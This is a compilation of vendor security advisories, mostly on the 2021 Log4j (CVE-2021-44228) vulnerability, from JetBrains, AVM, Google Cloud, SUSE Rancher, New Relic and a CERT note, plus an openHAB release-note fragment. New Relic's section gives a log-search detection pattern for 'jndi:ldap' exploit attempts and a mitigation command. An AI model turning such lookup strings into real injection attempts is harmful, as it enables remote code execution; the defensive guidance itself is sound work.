Previous versions of openHAB have focused on localizing the openHAB Main UI as well as configuration settings in the core. In this release we have focused on setting up an easy to use translation toolbox for openHAB Add-ons. Our new i18n-tool allows developers to create the default files containing English terms in their familiar Maven environment (just run `mvn i18n:generate-default-translations` in the bundle folder). Once added to GitHub those files will be uploaded automatically to [Crowdin  (opens new window)](https://crowdin.com/project/openhab-addons) - a collaboration platform to support multilingual translations. This will allow everyone in our community to translate into their language of choice without requiring any development skills. Completed translations are synced back to our repository periodically. If your language is missing, please help and visit [Crowdin  (opens new window)](https://crowdin.com/project/openhab-addons)!

## [#](#summary) Summary

These highlights are certainly not all that is new - if you want to learn about all the details, please check out [the official release notes  (opens new window)](https://github.com/openhab/openhab-distro/releases/tag/3.2.0).

We wish you a lot of fun automating your home and we are sure that this new release will help you achieving it. If you have any questions or want to share your experiences, do not hesitate to join our [great community  (opens new window)](https://community.openhab.org/) and get in touch with us!

Merry Christmas to all of you!

# Log4j vulnerability and JetBrains Products and Services

![Hadi Hariri](https://blog.jetbrains.com/wp-content/uploads/2021/08/bio-200x200.png)

[Hadi Hariri](https://blog.jetbrains.com/author/hadi-hariri-jetbrains-com)

## What happened

Similar to the rest of the industry, we became aware on the 10th of December 2021 of the Remote Code Execution [vulnerability CVE-2021-44228](https://www.lunasec.io/docs/blog/log4j-zero-day/) in the popular Java logging library log4j (all versions between 2.0 and 2.14.1 are vulnerable). We immediately took action to mitigate any potential impacts on our applications and systems. We’d like to provide you with an update.

## Actions we’ve taken

We have run an audit of the applications that use log4j and have upgraded to 2.15.0 where necessary. Following is the list of already audited products and their status:

* All IntelliJ platform based IDEs – Not affected.
* All .NET tools – Not affected.
* Toolbox – Not affected.
* TeamCity – Not affected. Investigation details: [TW-74298](https://youtrack.jetbrains.com/issue/TW-74298).
* Hub – Fix was released in version [#2021.1.14063](https://www.jetbrains.com/hub/download/) on 13th of December 2021. *Please check updates below*.
* YouTrack Standalone – Fix was released in version [#2021.4.35970](https://www.jetbrains.com/youtrack/download/get_youtrack.html#section=standalone) on 14th of December 2021. Details for both Hub and YouTrack: [JT-67582](https://youtrack.jetbrains.com/issue/JT-67582). *Please check updates below.*
* YouTrack InCloud – Fix was released on 10th of December 2021.
* Datalore – Not affected.
* Space – Not affected.
* Code With Me – Fix was released on 13th of December 2021 (only jitsi which is used for calls was affected).
* Gateway – Not affected.
* Kotlin – Not affected.
* Ktor – Not affected.
* MPS – Not affected.
* JetBrains Account – Fix was released on 10th of December 2021.
* Floating license server – Fix was released in version [#30211](https://www.jetbrains.com/help/license_server/release_notes.html#30211) on 11th of December 2021.
* Upsource – Fix was released in version [#2020.1.1952](https://www.jetbrains.com/upsource/download/) on 13th of December 2021.

We are continuing to test our services to see whether they are vulnerable, as a result of using third party components, and if/where applicable, take the necessary actions. We are also monitoring further development of the story.

## Actions you should take

If you are a user of YouTrack Standalone, Hub, Upsource, or Floating license server, please make sure you have either updated to the newly released versions or restarted the services with the `-Dlog4j2.formatMsgNoLookups=true` JVM parameter.

**Update 14th December 2021 – 18:25 CET**
Administrators of YouTrack Standalone and Hub installations must take further action to secure their instances. Please please refer to the [YouTrack](https://blog.jetbrains.com/youtrack/2021/12/youtrack-update-regarding-log4j2-vulnerability/) and [Hub](https://blog.jetbrains.com/hub/2021/12/14/hub-update-regarding-log4j2-vulnerability/) blog posts for further details. Also, the Hub release was in [2021.1.14080](https://www.jetbrains.com/hub/download/) as opposed to [2021.1.14063](https://www.jetbrains.com/hub/download/) listed above.

# Current security notifications

**AVM Content**

Please consider our [security information about updates](/service/security-information-about-updates/) as well.

| Release date | Update and security topic |
| --- | --- |
| **19.07.2023** | No "Avrecon" malware on FRITZ! products  Currently there are many reports about the botnet malware "Avrecon", which can infect Linux-based routers. Comprehensive investigations have not revealed any vulnerabilities in our products which could be used to infect them with the "Avrecon" botnet malware. No botnet malware is active on our products. Our own observations and customer reports indicate that no botnet malware is active on on our products. |
| **29.03.2023** | Security information on the Wi-Fi topic "Framing Frames" of the Wi-Fi standard  A scientific paper on security issues in the Wi-Fi standard entitled "Framing Frames" is currently being discussed in specialist circles. Our products are not affected by any of the implementation-specific issues described in the paper. Also discussed is a security issue with the 802.1x login method known as "WPA Enterprise". FRITZ!Box does not offer this method and is therefore not affected by this either.  The standard-specific denial-of-service (DoS) possibility discussed by the researchers also applies to our products, as it does for every wireless device from any manufacturer; and will continue to apply until the standard changes. However, there are always DoS possibilities when it comes to wireless technologies and many Wi-Fi clients reconnect very quickly (0.5 to 3.5 seconds). The connection would only be briefly interrupted, but no data could be stolen.  Overall, we assess the threat posed by the "Framing Frames" vulnerability as rather low. Irrespective of the points currently being discussed, we generally recommend always using higher-level encryption methods such as HTTPS or VPN when using public hotspots. With the current FRITZ!OS 7.50, it is now even easier to use VPN in a hotspot. Find out more here: [https://en.avm.de/service/vpn/](/service/vpn/) |
| **04.05.2022** | uClibc and uClibc-ng: FRITZ!Box not affected  A vulnerability in the free software projects uClic and uClibc-ng regarding the use of transaction IDs in DNS queries has recently been discovered. FRITZ!OS does not use these projects for DNS queries to the internet and is therefore not affected by this vulnerability. |
| **13.12.2021** | Vulnerability affecting Java project "log4j"  A zero-day vulnerability has recently been discovered in the popular Java logging library "log4j". AVM products are not affected by this vulnerability. The MyFRITZ! service is also not affected. |
| **25.11.2021** | Phishing emails with FRITZ!Box answering machine message  Phishing emails are currently circulating that appear to be sent in the name of FRITZ!Box. The phishing email replicates the content of a FRITZ!Box push service email and claims to contain an attachment with an answering machine message. However, the attachment is fraudulent.  Please do not open any attachments or links in such emails. If you do not use the FRITZ!Box push service, ignore any emails like this. If you do use the FRITZ!Box push service, you should carry out the following steps to verify the email:   * Compare the sender of the email with the senders you have set up for the FRITZ!Box push service. * Check whether the phone number mentioned in the email corresponds to a landline number you have set up in your FRITZ!Box. * Check that the attachment in the email has the file extension "wav". |
| **18.08.2021** | Router security  There are currently media reports about vulnerabilities in routers with Realtek system-on-a-chips (SoCs). AVM products are not affected. |
| **10.08.2021** | Router security  There are currently reports in the media about the CVE 2021-20090, 2021-20091 and 2021-20092 router vulnerabilities. AVM products are not affected. The vulnerabilities only apply to OEM devices from one manufacturer; the devices are listed [here](https://de.tenable.com/security/research/tra-2021-13). |
| **11.05.2021** | "FragAttacks" Wi-Fi vulnerability  Security researchers today drew attention to the “FragAttacks” Wi-Fi vulnerability. The vulnerability is manufacturer-independent and affects various wireless devices such as smartphones, notebooks, routers and game consoles. We are not aware of an unauthorized exploitation of FragAttacks, which could also only occur in the direct physical proximity of the Wi-Fi network. The security of services such as mail or apps that perform encryption using TLS protocols, or internet connection via HTTPS pages, is not affected by the vulnerability. Based on current knowledge, practical effects of FragAttacks are unlikely.  AVM started rolling out security updates against FragAttacks last week. An update is available for the popular FRITZ!Box 7590; and there are [public beta versions](/fritz-lab/fresh-from-development/fresh-from-development/) for other products. Additional updates for current products will follow soon.  AVM joins [the Wi-Fi Alliance in recommending](https://www.wi-fi.org/security-update-fragmentation) carrying out the updates offered by manufacturers for wireless devices such as notebooks, Wi-Fi speakers and smartphones.  **Update, 21.05.21** An update is also available for the FRITZ!Box 7530 AX, 7530, 7490, 6590 Cable, 6490 Cable, 5491 and 5490 models, with [public beta versions](/fritz-lab/fresh-from-development/fresh-from-development/) available for other products. Further updates for current products will follow soon. |
| **01.03.2021** | Router Security  Currently there are many reports about attempts to access FRITZ!Box products. These attempts are unsuccessful attempts to log in, apparently by guessing passwords, also known as "credential stuffing" attacks. Such attacks are constantly directed at countless devices connected with the internet.  Our Knowledge Base offers [this information](https://en.avm.de/service/fritzbox/fritzbox-7590/knowledge-base/publication/show/3299_FRITZ-Box-reports-Login-by-user-failed/).  As a general rule, we recommend heeding our instructions for secure passwords, which the user receives on the FRITZ!Box user interface. |
| **20.01.2021** | DNSpooQ - AVM products not affected  Security vulnerabilities have been discovered in DNSmasq software, whereby DNS entries could be manipulated. AVM products are not affected by this vulnerability. |
| **08.12.2020** | Amnesia:33 - AVM products not affected  A series of security gaps in the TCP/IP stack known as "Amnesia:33" was recently discovered in several networked devices. Devices from AVM are not affected.  Since every new version of FRITZ!OS includes updated security functions, we strongly recommend always loading the latest update to all devices. |
| **06.08.2020** | Wi-Fi security  There are currently a number of media reports regarding "Spectra", a vulnerability in Wi-Fi and Bluetooth chips. AVM products are not affected by the Spectra vulnerability.  In addition, media outlets are currently reporting on another Wi-Fi vulnerability called "Kr00k" (CVE-2020-3702). Common FRITZ!Box models including the 7590, 7580, 7530, 6590 Cable, 6591 Cable and 6660 Cable are essentially not affected by the Kr00k vulnerability. Other FRITZ! products with FRITZ!OS 7.20 or later are also not affected. All products for which the Protected Management Frames (PMF) feature is activated are also not affected. The PMF feature can be activated in the FRITZ!Box user interface under Wireless / Security / Additional Security Settings. AVM estimates the practical impact of the vulnerability to be low, as it did in February with Kr00k (CVE-2019-15126). The majority of Internet communication is encrypted and an attacker would have to be locally on site to exploit the vulnerability. |
| **09.06.2020** | Callstranger - FRITZ!Box not affected  There are currently reports of a security vulnerability involving the keyword "Callstranger." Security researchers have found a way to send an amplified amount of traffic using the UPnP protocol. FRITZ!Box is not affected as its UPnP service cannot be accessed or used from the Internet. |
| **27.02.2020** | Kr00K - FRITZ! products not affected  Media outlets have been reporting on the Kr00K Wi-Fi vulnerability (CVE-2019-15126). It only affects devices with Broadcom and Cypress chips, both of which are not used in FRITZ! products. Testing is being carried out for two older models from individual providers for special connections such as g.fast and channel bonding. If necessary, an update will be released in the near term for the two specialist models. According to the international CVSS standard, the vulnerability has a score of 3.1, which is low.    The relevance of the breach in practice is very small, as there are a number of conditions necessary for an attack to be successful, such as physical proximity to the respective device. Regardless of this, encryptions such as HTTPS are generally not affected as they operate at a higher level.    **Update, 02.03.2020** AVM has provided updates to FRITZ!OS 7.13 for the two affected specialist models, FRITZ!Box 7581and 7582. This provides a fix for the Kr00k vulnerability. |
| **21.02.2020** | Router security - "pppd" project  Media outlets are currently reporting on the CVE-2020-8597 vulnerability in the PPP daemon (pppd) project. AVM does not use this software project and AVM products are therefore not affected by the vulnerability. |
| **13.01.2020** | Router security – "Cable Haunt"  Media outlets are currently reporting on a vulnerability that impacts cable modems. FRITZ!Box products are not affected by "Cable Haunt". The vulnerable component does not exist in FRITZ!OS. |
| **11.04.2019** | Wireless Security - WPA3 "Dragonblood"  Media outlets have reported on a vulnerability in the new WPA3 security protocol for devices such as smartphones, tablets, routers etc. The FRITZ!Box is not affected by this vulnerability. The recently announced FRITZ!Repeater 3000 is the only AVM product that already supports WPA3. The new WPA3 WiFi standard is not active in the repeater's factory settings.  AVM has already released an update for the FRITZ!Repeater 3000 as a Lab version, which addresses the points of the current WPA3 vulnerability. AVM also recommends always choosing a really long, strong network password. The password evaluation in FRITZ!OS helps you find a strong password. AVM strongly recommends deploying the provided updates from manufacturers for all wireless clients, for example notebooks, smart TVs or tablets.  The practical impact of the WPA3 vulnerability is considered to be low due to it still being new and less widespread than other WPA standards. The current standard used by most wireless devices is WPA2. It has proven itself over many years in the use of long, strong passwords. |
| **08.08.2018** | Wireless security and WPA2  Media reports are currently discussing a potential attack on the WPA2 security protocol. AVM doesn't see any practical implications on the FRITZ!Box if the network key is correspondingly complex. AVM recommends using a network key that the FRITZ!Box recognizes as "good" or "strong". Due to its length, the network key that is preset upon delivery is also secure. |
| **25.05.2018** | Malware VPNFilter - AVM products not affected  VPNFilter is a malware infecting routers around the world, and is a global issue that has been getting a lot of attention in the media. There is no evidence that AVM products are affected. |
| **04.01.2018** | Meltdown and Spectre – no potential attacks on AVM products  Update 17.01.2018Currently AVM sees no further potential for attacks on the security concept of AVM products due to the security breaches in processors known as "Spectre" and "Meltdown". We are still in contact with the chip producers we work with.  Report 04.01.2018AVM is currently investigating the security breaches in processors known as Spectre and Meltdown and is in contact with the chip producers that AVM cooperates with. We see no potential for attacks on the security concept of AVM products at the moment.To take advantage of the weaknesses the attacker would need to execute his application directly on the AVM product. Unlike open architecture systems with access to the operating system, our products are specifcally designed not to run third-party applications. |
| **13.12.2017** | Security leak in TLS negotiation (Robotattack) - FRITZ!Box not affected  Media have reported about security breaches in various TLS implementations (CVE-2017-1000385).FRITZ!Box is not affected by this. |
| **16.10.2017** | Krack breach in WPA2 (updated 10.11.2017)  Update 10.11.2017 In rare cases a router could be configured so it is able to access the internet provided by another router via wireless LAN uplink. This will be addressed with the next FRITZ!OS release.  Update 20.10.2017 AVM released first updates for wireless repeaters and WiFi/powerline products: > More information  Update 19.10.2017 Multiple WPA2 weaknesses were made public on 16 October 2017. Almost all indicated attacks target wireless LAN clients. All attacks would have to occur within a close range of the targeted wireless LAN.  All AVM products that are solely used as wireless access points are not affected, for example FRITZ!Boxes on broadband connections (DSL, cable, WAN, etc.). AVM products that are used as wireless LAN clients are affected by some of the indicated possibilities.  Overview: FRITZ!Box on a broadband connection used as a wireless access point (preconfigured and common operating mode): no update necessary FRITZ!Box with wireless LAN uplink to another router (deviating from the preset, rarely used operating mode): upcoming update recommended  FRITZ!WLAN Repeater used as a wireless bridge (preconfigured and common operating mode): upcoming update recommended FRITZ!WLAN Repeater used as a LAN bridge (deviating from the preset, rarely used operating mode): no update necessary  FRITZ!Powerline supporting WiFi used as a powerline bridge (powerline uplink) (preconfigured and common operating mode): no update necessary FRITZ!Powerline supporting WiFi used as a wireless bridge (wireless LAN uplink) (deviating from the preset, rarely used operating mode): upcoming update recommended  The security of the wireless home network depends on the secure connection of each wireless device included. Based on the internationally used CVSS classification, the WPA2 weakness was rated at 5.4 (medium) and is therefore considered a minor problem. AVM strongly recommends to deploy the provided updates from manufacturers for all wireless LAN clients (for example notebook or Android smartphone)  Update 17.10.2017 > WPA2 flaw – FRITZ!Box on broadband connections are secure  Report from 16.10.2017 Several media have reported about a leak in the WPA2 protocol of wireless networks today. WPA is relevant for all wireless LAN products from smartphone to router all the way to IP cameras. So far there have been no attacks reported, which could only occur in a direct wireless environment. More details are needed to fully assess the situation. Besides Krack, internet connections via HTTPS pages (online banking, Google, Facebook, etc.) are secureley encrypted.  If necessary, AVM will provide an update as always. Please find the statement from the Wi-Fi Alliance [> here](https://www.wi-fi.org/news-events/newsroom/wi-fi-alliance-security-update). |
| **05.10.2017** | Security leaks in DNS server software Dnsmasq - FRITZ!Box not affected  Media outlets reported about several security leaks in the DNS server software Dnsmasq.  FRITZ!Box is not affected, since AVM does not use the Dnsmasq software in FRITZ!OS. |
| **04.07.2017** | Information on home network devices under IPv6  After visiting a malicious website for a longer period it could be possible – under very unlikely circumstances – that information about home network devices (only device name, Mac and IP address) are visible when using devices with an activated IPv6 connection. Access is not possible. The risk is very low (CVSS v3: 3.1, low). This point will be fixed in the upcoming versions. |
| **19.04.2017** | FRITZ!OS 6.83 increases robustness  The current version FRITZ!OS 6.83 fixes a weakness of the outdated FRITZ!OS version 6.80/6.81. Under certain circumstances a restart could have occurred. No misuse was reported. The version 6.80/6.81 was already completely replaced by the version 6.83 via auto update. |
| **28.11.2016** | Attacks on the Deutsche Telekom network - FRITZ!Box secure  Media outlets have reported about a worldwide hacker attack on Internet routers. In Germany, this lead to disruptions in Speedport routers from the Deutsche Telekom.  FRITZ!Box models are not affected by the attacks. |
| **10.11.2016** | Certificate exchange for cable routers  In the course of a certificate exchange, AVM has been using new and improved manufacturer certificates since 2015. Older certificates were exchanged by software updates from cable providers. Users don't have to do anything. Misuse of older certificates was not reported. |
| **27.10.2016** | Dirty Cow in Linux - FRITZ!Box not affected  The FRITZ!Box perfectly secure due to regular security updates. Concerning CVE-2016-5195 (Dirty Cow), we currently see no affect on the security level of the FRITZ!Box firmware. |
| **07.06.2016** | Telephone fraud with routers  Recently there have been a few cases of fraudulent use of telephone services connecting through routers. Concerning the FRITZ!Box, this can only be done through rarely used configurations and mostly occurs in combination with older FRITZ!OS versions at this point. AVM is continuously increasing the features and security standards of the FRITZ!Box and generally advises the use of the latest version, right now being FRITZ!OS 6.50 or higher. The current version can be checked and updated over the [user interface](https://en.avm.de/service/fritzbox/fritzbox-7490/knowledge-base/publication/show/1_Opening-the-FRITZ-Box-user-interface/).  The latest update for FRITZ!Box cable models is supplied by the cable providers.  You can find additional [security tips](https://avm.de/?id=14183) in the Guide section. |
| **03.03.2016** | DROWN attacks, SSLv2: avm.de and myfritz.net not affected  Neither is the currently implemented SSL/TLS in the FRITZ!Box.  SSLv2 was only used for an externally hosted server that was responsible for a rarely visited subdomain of avm.de until recently. This was fixed the same day the DROWN possibility was released. |
| **17.02.2016** | Security breach through glibc in Linux network functions – FRITZ!Box not affected    Media like [arstechnica.com](http://arstechnica.com/security/2016/02/extremely-severe-bug-leaves-dizzying-number-of-apps-and-devices-vulnerable/) and [bbc.com](http://www.bbc.com/news/technology-35592916) have reported about a security leak in Linux networks via the glibc library.  FRITZ!Box is not affected, since AVM does not use glibc in FRITZ!OS. |
| **23.12.2015** | Infrastructure leak in cable network and cable modem – FRITZ!Box not affected  Media outlets have reported about a security leak in the infrastructure of cable networks as well as in cable modems. Through the leak it was possible to download profiles and passwords of modems from other customers.  FRITZ!Box is not affected by this security breach.  According to statements from Vodafone/Kabel Deutschland the leak has been closed by protection filters uploaded in mid December. |
| **20.05.2015** | Security breach through NetUSB – FRITZ!Box not affected  Media outlets are now reporting about a vulnerable service that is being used to execute arbitrary code on the router. The reports concern the service "USB Over IP", which routers use to access devices like USB printers in the local network. The driver that has been compromised is called NetUSB.    The FRITZ!Box is not affected by the exploited security flaw, as it never uses the NetUSB driver.    FRITZ!Box products, both hard and software, are all developed in house by AVM. Regular, free updates to the FRITZ!OS operating system are integral to the FRITZ!Box concept and keep all devices up to date with the current state of technology. |
| **06.01.2015** | Security breach through Rompager – FRITZ! products not affected  At the recent 31. Chaos Communication Congress, it was announced that the HTTP server Rompager showed multiple security leaks. FRITZ! products are not affected by this.  The HTTP server Rompager is a software used on many routers from other manufacturers to provide certain protocols. Among others, the security breach allows strangers to take over administration rights on affected routers. Please find more information on this topic and a list of affected devices under [this link](http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf). |

# Apache Log4j 2 Vulnerability

On this page, we provide the latest update of the
potential impact of the open-source Apache “Log4j 2”
vulnerability on Google Cloud products and services
based on the findings of our ongoing
investigation.  For the latest updates from the
Google Cybersecurity Action Team on recommendations for
investigating and responding to this vulnerability
please visit
our [blog post](https://cloud.google.com/blog/products/identity-security/recommendations-for-apache-log4j2-vulnerability).

Google Cloud is actively following the security
vulnerabilities in the open-source Apache “Log4j 2"
utility
([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)).
We are also aware of the reported Apache “Log4j 1.x”
vulnerability
([CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104)).
We encourage you to update to the latest version of
Log4j 2. We are currently assessing the potential impact
of the vulnerability for Google Cloud products and
services. This is an ongoing event and we will continue
to provide updates through this page and our customer
communications channels.

Based on our findings,
[Google Workspace core services](https://workspace.google.com/terms/user_features.html)
for consumer and paid users are not using Log4j 2 and
are not impacted by the issues identified in
CVE-2021-44228 and CVE-2021-45046. See below for a
detailed status of the Workspace core services and other
related products.

We recommend Google customers review all third-party
apps and solutions  accessing their data and
validate the security status of those apps with their
respective vendors. More details on managing apps
authorized to access Google Workspace data are
[here](https://support.google.com/a/answer/7281227#zippy=%2Creview-the-third-party-apps-in-your-environment)
and customers can review their list of solutions from
the
[Google Cloud Marketplace](https://cloud.google.com/marketplace)
by logging into their account. We also recommend
validating the security status of any apps developed and
deployed by customers within their environments.

**Background:** The Apache Log4j 2 utility is a
commonly used component for logging requests. On
December 9, 2021, a vulnerability was reported that
could allow a system running Apache Log4j 2 version 2.15
or below to be compromised and allow an attacker to
execute arbitrary code.

On December 10, 2021, NIST published a critical Common
Vulnerabilities and Exposure alert,
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
More specifically, Java Naming Directory Interface
(JNDI) features used in configuration, log messages, and
parameters do not protect against attacker controlled
LDAP and other JNDI related endpoints. An attacker who
can control log messages or log message parameters can
execute arbitrary code loaded from remote servers when
message lookup substitution is enabled.

**What should I do to protect
myself?** We strongly encourage customers
who manage environments containing Log4j 2 to update to
the [latest version](https://logging.apache.org/log4j/2.x/download.html).

# Apache Log4j 2 Vulnerability

On this page, we provide the latest update of the
potential impact of the open-source Apache “Log4j 2”
vulnerability on Google Cloud products and services
based on the findings of our ongoing
investigation.  For the latest updates from the
Google Cybersecurity Action Team on recommendations for
investigating and responding to this vulnerability
please visit
our [blog post](https://cloud.google.com/blog/products/identity-security/recommendations-for-apache-log4j2-vulnerability).

Google Cloud is actively following the security
vulnerabilities in the open-source Apache “Log4j 2"
utility
([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)).
We are also aware of the reported Apache “Log4j 1.x”
vulnerability
([CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104)).
We encourage you to update to the latest version of
Log4j 2. We are currently assessing the potential impact
of the vulnerability for Google Cloud products and
services. This is an ongoing event and we will continue
to provide updates through this page and our customer
communications channels.

Based on our findings,
[Google Workspace core services](https://workspace.google.com/terms/user_features.html)
for consumer and paid users are not using Log4j 2 and
are not impacted by the issues identified in
CVE-2021-44228 and CVE-2021-45046. See below for a
detailed status of the Workspace core services and other
related products.

We recommend Google customers review all third-party
apps and solutions  accessing their data and
validate the security status of those apps with their
respective vendors. More details on managing apps
authorized to access Google Workspace data are
[here](https://support.google.com/a/answer/7281227#zippy=%2Creview-the-third-party-apps-in-your-environment)
and customers can review their list of solutions from
the
[Google Cloud Marketplace](https://cloud.google.com/marketplace)
by logging into their account. We also recommend
validating the security status of any apps developed and
deployed by customers within their environments.

**Background:** The Apache Log4j 2 utility is a
commonly used component for logging requests. On
December 9, 2021, a vulnerability was reported that
could allow a system running Apache Log4j 2 version 2.15
or below to be compromised and allow an attacker to
execute arbitrary code.

On December 10, 2021, NIST published a critical Common
Vulnerabilities and Exposure alert,
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
More specifically, Java Naming Directory Interface
(JNDI) features used in configuration, log messages, and
parameters do not protect against attacker controlled
LDAP and other JNDI related endpoints. An attacker who
can control log messages or log message parameters can
execute arbitrary code loaded from remote servers when
message lookup substitution is enabled.

**What should I do to protect
myself?** We strongly encourage customers
who manage environments containing Log4j 2 to update to
the [latest version](https://logging.apache.org/log4j/2.x/download.html).

* Log4j 1.x

Can you please help us with getting some clarification on the CVE-2021-44228. Looks like CVE-2021-44228 also impacts the Log4j 1.x

Since we still have /opt/commvault/Base64/DbJars/log4j-1.2.16.jar, we are being told by our Cyber team that according to CVE-2021-44228 on the  <https://logging.apache.org/log4j/2.x/security.html>

Below is the snippet from logging.apache.org link above

#### Log4j 1.x mitigation

Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: Audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.

Does commvault use JNDI with Log4j 1.x ?

### CVE-2021-44228 - Log4j vulnerability

**SUSE Rancher is not affected by the Log4j vulnerability**, also know as Log4Shell - CVE-2021-44228.

The Helm chart for Istio v1.5, provided by Rancher and which is currently deprecated since Rancher v2.5.0, includes Zipkin and is vulnerable to Log4j. There is already a warning inside the UI that this chart is end of life.

Customers are advised to upgrade to the recent Istio versions provided inside Cluster Explorer, which do not use Zipkin and are not affected by the vulnerability.

More information about CVE-2021-44228 is available in [SUSE Security Portal](https://www.suse.com/security/cve/CVE-2021-44228.html).

# Security guidance for New Relic customers related to Apache Log4j vulnerabilities

Published Dec 15, 2021
•
4 min read

![Kymberlee Price Headshot](/sites/default/files/styles/1x1_100w/public/2022-01/kymberlee.jpg?h=f8973aeb&itok=tb3FJ3Q_)

By [Kymberlee Price, Senior Director, Product Security](/blog/authors/kymberlee-price)

New Relic has released Java Agent and Containerized Private Minion updates to address a critical vulnerability in the open-source Apache Log4j framework that was publicly disclosed on December 9, 2021, as well as an additional, low-risk vulnerability disclosed on December 14, 2021. The critical vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) can be exploited to allow malicious actors to control systems remotely or exfiltrate data. As a valued New Relic customer, we want to provide you with more information about the vulnerability, what New Relic is doing to protect our systems against this vulnerability, and steps you can take to protect your organization from this issue.

New Relic will update our Security Bulletins and customer guidance as new information becomes available.

***Call to action:**The Apache Log4j vulnerability [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) is critical in severity and should be remediated immediately wherever possible.*

**What is the recommended remediation?**

It is critical to upgrade Apache Log4j to version 2.16.0 or higher as soon as possible to remediate this vulnerability.

* New Relic released two product updates to remediate [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), a critical vulnerability recently identified in the log4j framework, as well as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046).
  + **Upgrade your Java Agent**. New versions are available to address vulnerabilities in the Apache Log4j framework. Additional information about this update, including workarounds, is outlined in New Relic’s Security Bulletin [NR21-03](https://docs.newrelic.com/docs/security/new-relic-security/security-bulletins/security-bulletin-nr21-03/).
  + **Upgrade your Containerized Private Minion (CPM).** Additional information about this update is outlined in New Relic’s Security Bulletin [NR21-04](https://docs.newrelic.com/docs/security/new-relic-security/security-bulletins/security-bulletin-nr21-04/).
* New Relic has released an open-source script, [nr-find-log4j](https://github.com/newrelic-experimental/nr-find-log4j), to help you identify services monitored by New Relic APM that depend on log4j and are potentially vulnerable. See <https://github.com/newrelic-experimental/nr-find-log4j> for usage instructions.
* [New Relic’s APM Environment functionality](https://docs.newrelic.com/docs/apm/agents/manage-apm-agents/troubleshooting/get-environment-data-about-your-apm-app/) can help you identify if your agents or applications are at risk due to the inclusion of a vulnerable version of log4j.   When viewing jars loaded in the jvm runtime, you can identify if log4j-core 2.x is present, as well as what version of the newrelic agent is in use, and initiate your security response processes to determine its impact.
* You can use [New Relic Log Management](/products/log-management) to help search your existing log records for attempted exploits of the recent log4j security vulnerability. Your log records may show a known attempt to exploit this vulnerability and may be helpful in tracking down malicious actors within your services.
  + First, select **Logs** in New Relic One.
  + Next, in the search bar **Find logs where**, enter `"jndi:ldap"`
  + Finally, select **Query logs**. Any logs that include `jndi:ldap` will be displayed.

**What has New Relic been doing to protect your data since the vulnerability was announced?**

New Relic’s Security Response process was initiated shortly after the log4j vulnerability was published on December 9, 2021. Working with our established vulnerability management processes, our engineering teams rapidly released updates. Our teams are diligently working with New Relic engineers, our partners, vendors, and subprocessors to ensure we have comprehensive remediation across our internal infrastructure.

**What is the Apache Log4j JNDI Vulnerability CVE-2021-44228?**

According to the [NIST National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-44228),  Apache Log4j2 <=2.14.1 JNDI “features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.”

Additionally, this vulnerability can be leveraged for data exfiltration even in scenarios where remote code execution has been mitigated. For this reason we advise, for CVE-2021-44228, updating all instances of log4j to 2.15.0 or implementing appropriate technical mitigations regardless of your current version of Java.

**What is the Apache Log4j CVE-2021-45046?**

[NIST National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) notes that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack.”

Additionally, “Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.noFormatMsgLookup` to `true` do NOT mitigate this specific vulnerability. Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (<2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).”

**Thank you for putting your trust in New Relic**

Keeping customer data secure is New Relic’s top priority; we have a well-established [security program](/security) that includes vulnerability management components that continuously scan and monitor our applications and systems for new vulnerabilities. Thevulnerability management program is reviewed annually as part of our [SOC2 certification](https://docs.newrelic.com/docs/security/security-privacy/compliance/certificates-standards-regulations/soc2/), and we are happy to share our latest SOC2 report as well as further details of our program under NDA.

As always, if you have any questions or need additional help, please reach out to your Account Team or visit [support.newrelic.com](http://support.newrelic.com) to engage our Support Team.

Thank you,

The New Relic Security Team

## Apache Log4j allows insecure JNDI lookups

#### Vulnerability Note VU#930724

Original Release Date: 2021-12-15 | Last Revised: 2024-04-17

---

### Overview

Apache Log4j allows insecure JNDI lookups that could allow an unauthenticated, remote attacker to execute arbitrary code with the privileges of the vulnerable Java application using Log4j.

CISA has published [Apache Log4j Vulnerability Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance) and provides a [Software List](https://github.com/cisagov/log4j-affected-db#software-list).

### Description

The default configuration of Apache Log4j supports [JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html) (Java Naming and Directory Interface) lookups that can be exploited to exfiltrate data or execute arbitrary code via remote services such as LDAP, RMI, and DNS.

This vulnerability note includes information about the following related vulnerabilities.

